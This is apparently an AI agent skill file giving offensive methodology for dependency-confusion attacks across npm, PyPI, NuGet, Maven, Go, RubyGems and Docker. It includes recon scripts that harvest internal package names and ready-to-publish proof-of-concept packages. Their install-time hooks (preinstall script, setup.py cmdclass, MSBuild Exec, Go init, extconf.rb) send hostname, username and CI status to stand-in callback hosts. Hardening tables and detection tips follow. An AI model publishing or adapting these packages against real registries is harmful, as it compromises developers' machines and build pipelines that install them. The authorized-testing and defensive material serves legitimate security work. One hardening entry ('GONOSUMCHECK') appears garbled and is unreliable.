---
name: offensive-dependency-confusion
description: "Deep-dive offensive methodology for dependency confusion and namespace attacks across all major package ecosystems. Covers npm scope confusion exploiting the gap between public and private scoped packages and .npmrc misconfigurations where registry mappings fail to pin internal scopes exclusively. Addresses PyPI namespace attacks through --extra-index-url resolution ordering, NuGet feed priority exploitation when multiple package sources are configured without clear directives, Maven and Gradle repository ordering where artifact resolution traverses repositories sequentially, Go module proxy abuse through GOPROXY misconfiguration, Ruby gems namespace squatting, and Docker image tag confusion with unqualified image references. Provides complete proof-of-concept methodology using safe callbacks including DNS canary via interactsh or Burp Collaborator and HTTP beacon with no destructive payload. Covers reconnaissance techniques for discovering internal package names through GitHub repository analysis, error message harvesting, JavaScript source map extraction, lock file parsing, job postings mentioning internal tools, and package manifest inspection. Directly references and builds upon Alex Birsan's seminal 2021 dependency confusion research. Each ecosystem section includes registry-specific exploitation mechanics, configuration vulnerabilities, and defensive countermeasures for engagement reporting."
---

# Offensive Dependency Confusion and Namespace Attacks

Dependency confusion exploits a fundamental design tension in package managers:
the need to resolve packages from multiple sources. When an organization
maintains internal packages alongside public dependencies, the resolution
logic becomes an attack surface. You exploit the gap between how developers
intend packages to resolve and how package managers actually resolve them.

Alex Birsan's 2021 research demonstrated that this class of attack affected
Apple, Microsoft, PayPal, Shopify, Netflix, Yelp, Tesla, and Uber, among
others. The root cause -- preferring a higher-versioned public package over
a lower-versioned private one -- remains exploitable wherever registry
configuration is incomplete.

This skill provides ecosystem-specific exploitation techniques, safe PoC
methodology, and comprehensive reconnaissance approaches for discovering
internal package names during authorized engagements.

## Quick Workflow

1. Perform reconnaissance to discover internal/private package names used by the target.
2. Identify the target's package ecosystems and registry configuration.
3. Verify that candidate package names are unclaimed on the corresponding public registry.
4. Prepare a safe PoC package with a DNS canary or HTTP callback and a high version number.
5. Publish the PoC to the public registry with a clear security research description.
6. Monitor the callback endpoint for execution confirmations from target infrastructure.
7. Record callback metadata (hostname, username, CI flag, timestamp) as evidence.
8. Remove the PoC package from the public registry after confirmation or engagement window closes.
9. Document the full attack chain, impacted systems, and registry hardening recommendations.

---

## Reconnaissance for Internal Package Names

Discovering what internal packages a target uses is the critical first step.
You extract package names from every available artifact and signal.

### Lock File Analysis

Lock files are the highest-fidelity source of internal package names. They
list every resolved dependency with exact versions and, in some formats,
the registry source.

```bash
# npm: package-lock.json reveals resolved URLs
# Internal packages often resolve to a private registry
cat package-lock.json | jq -r '
  .packages | to_entries[] |
  select(.value.resolved != null) |
  select(.value.resolved | test("registry.npmjs.org") | not) |
  .key
' | sed 's|node_modules/||' | sort -u

# yarn: yarn.lock includes registry URLs inline
grep -B1 'resolved "https://registry.yarnpkg.com' yarn.lock | \
  grep -v 'resolved' | sed 's/@.*//' | sort -u > public_packages.txt
grep -B1 'resolved "https://' yarn.lock | \
  grep -v 'resolved' | grep -v 'yarnpkg.com' | grep -v 'npmjs.org' | \
  sed 's/@.*//' | sort -u > possibly_internal.txt

# pip: requirements.txt may reference internal packages
# Look for packages not found on public PyPI
grep -v '^#' requirements.txt | grep -v '^\s*$' | \
  sed 's/[>=<!\[].*//; s/\s*$//' | while read pkg; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://pypi.org/pypi/$pkg/json")
    [ "$code" = "404" ] && echo "[INTERNAL] $pkg"
  done

# Pipfile.lock contains source information
cat Pipfile.lock | jq -r '.default | keys[]' > pipfile_packages.txt
```

### JavaScript Source Maps

Production JavaScript bundles sometimes ship with source maps or readable
module paths that reveal internal package names.

```bash
# Extract source map URLs from JavaScript bundles
curl -s https://target.example.com/app.js | \
  grep -oP '//# sourceMappingURL=\K.*'

# Download and parse source map for internal module paths
curl -s https://target.example.com/app.js.map | \
  jq -r '.sources[]' | grep -E 'node_modules/(@[^/]+/[^/]+|[^/]+)' | \
  sed 's|.*node_modules/||; s|/.*||' | sort -u

# Look for webpack chunk manifests
curl -s https://target.example.com/ | \
  grep -oP 'src="[^"]*chunk[^"]*"' | \
  sed 's/src="//;s/"//' | while read chunk; do
    curl -s "https://target.example.com/$chunk" | \
      grep -oP '"[a-zA-Z@][a-zA-Z0-9_./-]+"' | sort -u
  done
```

### Error Messages and Stack Traces

Application errors leak internal package names in stack traces and module
resolution failures. Trigger 404 pages, API errors, and debug endpoints.

```bash
curl -s https://target.example.com/nonexistent 2>&1 | \
  grep -oP 'Cannot find module .?\K[a-zA-Z@][a-zA-Z0-9_.-/]+'
# Also search Wayback Machine for cached error pages with module names
```

### GitHub Repository Mining

```bash
# Search GitHub for the organization's package manifests and registry configs
gh api search/code \
  -X GET \
  -f q='org:targetcorp filename:package.json registry.corp' \
  -f per_page=10 | jq -r '.items[].path'

# Search for .npmrc files that reveal scope-to-registry mappings
gh api search/code \
  -X GET \
  -f q='org:targetcorp filename:.npmrc' \
  -f per_page=10

# Search for requirements.txt with --extra-index-url
gh api search/code \
  -X GET \
  -f q='org:targetcorp extra-index-url filename:requirements' \
  -f per_page=10

# Search for NuGet.config with private feeds
gh api search/code \
  -X GET \
  -f q='org:targetcorp filename:nuget.config packageSources' \
  -f per_page=10
```

### Additional Recon Sources

```bash
# Docker Hub, npm org scopes, PyPI author search
curl -s "https://hub.docker.com/v2/repositories/targetcorp/?page_size=100" | jq -r '.results[].name'
curl -s "https://registry.npmjs.org/-/org/targetcorp/package" | jq -r 'keys[]'
# Also mine job postings for internal tool names and library references
```

---

## npm Scope Confusion

npm uses scoped packages (`@scope/package-name`) to namespace packages. The
confusion arises when internal scoped packages are not properly mapped to a
private registry, or when unscoped internal packages exist.

### Unscoped Package Confusion

When an organization uses unscoped internal packages, npm resolves from the
default registry (npmjs.org) unless explicitly overridden.

```ini
# Vulnerable .npmrc -- no registry override for internal packages
registry=https://registry.npmjs.org/
# Internal packages like "corp-utils" resolve from public npm
```

```ini
# Slightly better but still vulnerable .npmrc
registry=https://npm.corp.example.com/
# Falls back to public npm if the private registry does not have the package
# or if the public version is higher
```

```bash
# Check if unscoped internal names are claimable on public npm
target_packages="corp-utils internal-auth shared-config data-pipeline"
for pkg in $target_packages; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
  echo "$pkg: HTTP $code"
done
```

### Scoped Package Confusion

Even scoped packages are vulnerable if the scope-to-registry mapping is
missing or misconfigured.

```ini
# Vulnerable .npmrc -- scope exists but no registry mapping
registry=https://registry.npmjs.org/
# @targetcorp/internal-lib resolves from public npm if the scope
# is not mapped to the private registry
```

```ini
# Correct .npmrc configuration (for reference in reports)
registry=https://registry.npmjs.org/
@targetcorp:registry=https://npm.corp.example.com/
# Now @targetcorp/* packages resolve exclusively from the private registry
```

```bash
# Check if the target's npm scope is claimed on public npm
curl -s "https://registry.npmjs.org/@targetcorp%2ftest-package" | jq '.error'
# "Not found" means the scope may be unclaimed
# Try to register the scope on npmjs.org if it is not reserved
```

### npm PoC Package

```json
{
  "name": "corp-internal-utils",
  "version": "999.0.0",
  "description": "Security research - dependency confusion PoC - contact security@researcher.example",
  "scripts": {
    "preinstall": "node callback.js || true"
  }
}
```

```javascript
// callback.js -- safe metadata collection for npm PoC
const https = require('https');
const os = require('os');
const dns = require('dns');

// DNS canary (works even with outbound HTTP filtering)
const label = `npm-${os.hostname().slice(0, 20)}-${os.userInfo().username}`;
dns.resolve(`${label}.your-id.interact.sh`, () => {});

// HTTP callback with minimal metadata
const payload = JSON.stringify({
  hostname: os.hostname(), username: os.userInfo().username,
  ci: process.env.CI || 'false', platform: os.platform(),
  cwd: process.cwd(), timestamp: new Date().toISOString()
});
const req = https.request({
  hostname: 'canary.researcher.example', path: '/npm-confusion',
  method: 'POST', headers: { 'Content-Type': 'application/json' }, timeout: 5000
}, () => {});
req.on('error', () => {});
req.write(payload);
req.end();
```

---

## PyPI Namespace Attacks

Python's pip has two index configuration options with critically different
security properties.

### --extra-index-url vs --index-url

```bash
# VULNERABLE: --extra-index-url adds a second index alongside PyPI
pip install --extra-index-url https://pypi.corp.example.com/simple/ internal-lib
# pip checks BOTH PyPI and the private index, picks the highest version

# SAFE: --index-url replaces PyPI entirely
pip install --index-url https://pypi.corp.example.com/simple/ internal-lib
# pip ONLY checks the private index
```

```ini
# Vulnerable pip.conf (or pip.ini on Windows)
[global]
extra-index-url = https://pypi.corp.example.com/simple/
# All pip install commands now check both indexes

# Safe pip.conf
[global]
index-url = https://pypi.corp.example.com/simple/
# Public PyPI is no longer consulted
```

### PyPI PoC Package

```python
# setup.py -- PoC with install/develop/egg_info hook vectors
import os, sys, socket, urllib.request
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info

CANARY = "canary.researcher.example"
PKG = "internal-data-pipeline"

def safe_callback(phase):
    """DNS + HTTP callback with minimal metadata. No secrets, no file access."""
    try:
        h = socket.gethostname()[:30]
        u = os.getenv("USER", os.getenv("USERNAME", "unknown"))[:20]
        ci = "1" if any(os.getenv(v) for v in
            ["CI", "GITHUB_ACTIONS", "GITLAB_CI", "JENKINS_URL"]) else "0"
        label = f"pypi-{h}-{u}-{phase}-ci{ci}".replace(" ", "-").replace(".", "-")[:60]
        try: socket.getaddrinfo(f"{label}.your-id.interact.sh", 80)
        except socket.gaierror: pass
        data = f"pkg={PKG}&host={h}&user={u}&phase={phase}&ci={ci}".encode()
        urllib.request.urlopen(urllib.request.Request(
            f"https://{CANARY}/pypi-confusion", data=data, method="POST"), timeout=5)
    except Exception: pass

class InstallHook(install):
    def run(self): safe_callback("install"); install.run(self)
class DevelopHook(develop):
    def run(self): safe_callback("develop"); develop.run(self)
class EggInfoHook(egg_info):
    def run(self): safe_callback("egg_info"); egg_info.run(self)

setup(
    name=PKG, version="9999.0.0",
    description="Security research PoC -- dependency confusion -- contact security@researcher.example",
    cmdclass={"install": InstallHook, "develop": DevelopHook, "egg_info": EggInfoHook},
)
```

---

## NuGet Feed Priority Exploitation

NuGet resolves packages from configured feeds in the order they are listed,
but selects the highest version found across all feeds.

```xml
<!-- Vulnerable: both feeds active, highest version wins across all -->
<configuration>
  <packageSources>
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />
    <add key="internal" value="https://nuget.corp.example.com/v3/index.json" />
  </packageSources>
</configuration>

<!-- Hardened: clear + packageSourceMapping (for remediation reporting) -->
<configuration>
  <packageSources><clear />
    <add key="internal" value="https://nuget.corp.example.com/v3/index.json" />
  </packageSources>
  <packageSourceMapping>
    <packageSource key="internal"><package pattern="Corp.*" /></packageSource>
  </packageSourceMapping>
</configuration>
```

```bash
# Recon: extract NuGet package names from .csproj files
grep -rh 'PackageReference Include=' --include="*.csproj" . | \
  sed 's/.*Include="//; s/".*//' | sort -u > nuget_packages.txt

# Check public NuGet for availability
while read pkg; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://api.nuget.org/v3-flatcontainer/${pkg,,}/index.json")
  [ "$code" = "404" ] && echo "[AVAILABLE] $pkg"
done < nuget_packages.txt
```

```csharp
// NuGet PoC package -- .targets file for build-time execution
// Place in build/Corp.Internal.Auth.targets
// MSBuild executes this during package restore
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="DepConfusionCallback" BeforeTargets="Build">
    <Exec Command="curl -s https://canary.researcher.example/nuget-$(COMPUTERNAME)" 
          IgnoreExitCode="true" />
  </Target>
</Project>
```

---

## Maven and Gradle Repository Ordering

Java ecosystems resolve artifacts by iterating through configured repositories
in order. If Maven Central is listed before a private repository, an attacker
can claim the groupId:artifactId on Central.

```xml
<!-- pom.xml: Maven checks central first; attacker claims com.targetcorp:internal-lib -->
<repositories>
  <repository><id>central</id><url>https://repo.maven.apache.org/maven2</url></repository>
  <repository><id>internal</id><url>https://nexus.corp.example.com/repository/maven-releases/</url></repository>
</repositories>
```

```bash
# Check Maven Central for groupId:artifactId availability
group_path=$(echo "com.targetcorp" | tr '.' '/')
curl -s -o /dev/null -w "%{http_code}" \
  "https://repo.maven.apache.org/maven2/$group_path/internal-auth-lib/maven-metadata.xml"
```

```groovy
// build.gradle: Gradle checks mavenCentral() first -- same vulnerability
repositories {
    mavenCentral()
    maven { url "https://nexus.corp.example.com/repository/maven-releases/" }
}
```

---

## Go Module Proxy Abuse

Go modules resolve through the GOPROXY chain. The default configuration
`GOPROXY=https://proxy.golang.org,direct` means the public proxy is
consulted first.

```bash
# Check if a Go module path is claimable
# Internal modules often use the corp domain as the module path
curl -s "https://proxy.golang.org/corp.example.com/internal-lib/@v/list"
# 404/410 means it is not cached on the public proxy

# GOPROXY misconfiguration allows confusion
# If GOPROXY=https://proxy.golang.org,https://goproxy.corp.example.com
# the public proxy is checked first
```

```bash
# Recon: extract Go module dependencies
cat go.sum | awk '{print $1}' | sort -u | \
  grep -v 'github.com\|golang.org\|google.golang.org' > go_internal_modules.txt
```

```go
// Go module with init() callback for PoC
package confusionpoc

import ("net"; "net/http"; "os"; "os/user"; "strings")

func init() {
	hostname, _ := os.Hostname()
	u, _ := user.Current()
	uname := "unknown"
	if u != nil { uname = u.Username }
	label := strings.ReplaceAll(hostname+"-"+uname, ".", "-")
	net.LookupHost(label + ".your-id.interact.sh")
	http.Get("https://canary.researcher.example/go-confusion?h=" + hostname + "&u=" + uname)
}
```

---

## Ruby Gems and Docker Image Confusion

### Ruby Gems Squatting

```bash
# Check if a gem name is available
curl -s "https://rubygems.org/api/v1/gems/corp-internal-utils.json" | \
  jq '.name // "NOT FOUND"'
```

```ruby
# Gemspec with post-install callback via ext/extconf.rb
Gem::Specification.new do |s|
  s.name = "corp-internal-utils"; s.version = "999.0.0"
  s.summary = "Security research - dependency confusion PoC"
  s.authors = ["Security Researcher"]; s.extensions = ["ext/extconf.rb"]
end
# ext/extconf.rb -- executed during gem install
require 'socket'; require 'net/http'
h, u = Socket.gethostname, (ENV['USER'] || 'unknown')
Net::HTTP.get(URI("https://canary.researcher.example/ruby-#{h}-#{u}")) rescue nil
File.write("Makefile", "all:\n\ttrue\ninstall:\n\ttrue\n")
```

### Docker Image Tag Confusion

Unqualified image names (e.g. `targetcorp/backend`) resolve to Docker Hub.
If the Docker Hub namespace is unclaimed, you register it and push a
trojanized image that targets pull automatically.

```bash
# Check if the Docker Hub namespace is available
curl -s "https://hub.docker.com/v2/repositories/targetcorp/" | jq '.detail // .count'
```

```yaml
# Vulnerable docker-compose.yml -- unqualified names resolve to Docker Hub
services:
  backend:
    image: targetcorp/backend:latest  # should be registry.corp.example.com/...
  frontend:
    image: targetcorp/frontend:v2.1   # mutable tag; should use @sha256:... digest
```

---

## Safe PoC Methodology

You never deploy destructive or exfiltration-capable payloads. Every PoC
uses safe callbacks only.

### DNS Canary Options

```bash
# interactsh (preferred -- free, reliable OOB detection)
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client -v
# Burp Collaborator -- generate payload from Burp Pro, monitor Collaborator tab
# Self-hosted -- run a logging DNS server on your own NS-delegated domain
```

### Callback Data Constraints

Collect only what proves execution and identifies the affected system:
hostname, username, CI boolean, OS/platform, package manager version,
timestamp. Never collect file contents, environment variable values beyond
the CI flag, credentials, tokens, directory/process listings, or any form
of persistent access.

### Package Description Template

Include in every PoC package published to a public registry:

```
Security Research - Dependency Confusion Proof of Concept.
Authorized security assessment. No malicious functionality. Sends a DNS/HTTP
callback to a researcher-controlled server. Contact: security@researcher.example
Report reference: [ENGAGEMENT-ID]
```

---

## Detection / Defender View

Understanding the attacker's perspective helps you provide actionable
remediation guidance in your engagement reports.

**Registry configuration hardening by ecosystem:**

| Ecosystem | Vulnerable Pattern                    | Secure Pattern                            |
|-----------|---------------------------------------|-------------------------------------------|
| npm       | No scope-to-registry mapping          | `@scope:registry=` in .npmrc              |
| pip       | `--extra-index-url`                   | `--index-url` (exclusive)                 |
| NuGet     | Multiple feeds without `<clear />`    | `<clear />` + packageSourceMapping        |
| Maven     | Central listed before private repo    | Private repo first, or mirror settings    |
| Gradle    | `mavenCentral()` before private       | Private repo only in `repositories {}`    |
| Go        | Default GOPROXY                       | `GONOSUMCHECK` + `GOPRIVATE` for corp     |
| Ruby      | Default gem sources                   | `source` block with private gem server    |
| Docker    | Unqualified image names               | FQDN registry prefix + digest pinning     |

**Detection signals**: unexpected outbound DNS/HTTP during install/build
phases; lock file changes pointing to public registries for known-internal
packages; version jumps to 999.x or 9999.x; new packages in build logs
not present in prior builds.

```bash
# Monitor install-time network activity; audit install scripts
strace -f -e trace=network npm install 2>&1 | grep -i connect
npx can-i-ignore-scripts
pip download --no-deps --no-binary :all: suspicious-package && tar xzf *.tar.gz && cat */setup.py
```

---

## Engagement Cheatsheet

| Step | Action                                            | Tool / Command                     |
|------|---------------------------------------------------|------------------------------------|
| 1    | Parse lock files for internal names               | jq, grep, awk                      |
| 2    | Mine GitHub for package manifests and .npmrc       | gh api search/code                  |
| 3    | Extract names from JS source maps                 | curl, jq                           |
| 4    | Check public registry availability                | curl against registry APIs          |
| 5    | Scan with confused                                | `confused -l npm package-lock.json` |
| 6    | Start DNS canary listener                         | interactsh-client                   |
| 7    | Build PoC package (high version, safe callback)   | Custom setup.py / package.json     |
| 8    | Publish to public registry                        | `npm publish` / `twine upload`      |
| 9    | Monitor for callbacks                             | interactsh / Burp Collaborator      |
| 10   | Document findings with callback evidence           | Screenshots, DNS logs              |
| 11   | Remove PoC packages from public registries        | `npm unpublish` / PyPI delete       |
| 12   | Deliver remediation: registry pinning per ecosystem| Report template above              |

**Timing**: CI/CD callbacks arrive within minutes of a commit; developer
workstations may take days or weeks. Keep canary listeners running for the
full engagement window.

**Coordination**: Confirm scope includes public registry publishing.
Pre-coordinate with the target security team. Document package names,
versions, and publication timestamps. Remove PoC packages promptly after
the engagement window closes.

---

## Key References

- Alex Birsan, "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies" (2021): https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- confused -- dependency confusion scanner: https://github.com/visma-prodsec/confused
- npm documentation on scopes and registry configuration: https://docs.npmjs.com/cli/v9/using-npm/scope
- pip documentation on --index-url vs --extra-index-url: https://pip.pypa.io/en/stable/cli/pip_install/
- NuGet Package Source Mapping: https://learn.microsoft.com/en-us/nuget/consume-packages/package-source-mapping
- SLSA Framework (Supply-chain Levels for Software Artifacts): https://slsa.dev/
- interactsh -- OOB interaction gathering: https://github.com/projectdiscovery/interactsh
- "Backstabber's Knife Collection: A Review of Open Source Software Supply Chain Attacks" (2020)
- MITRE ATT&CK T1195.001 -- Supply Chain Compromise: Compromise Software Dependencies and Development Tools
- GitHub Advisory Database: https://github.com/advisories
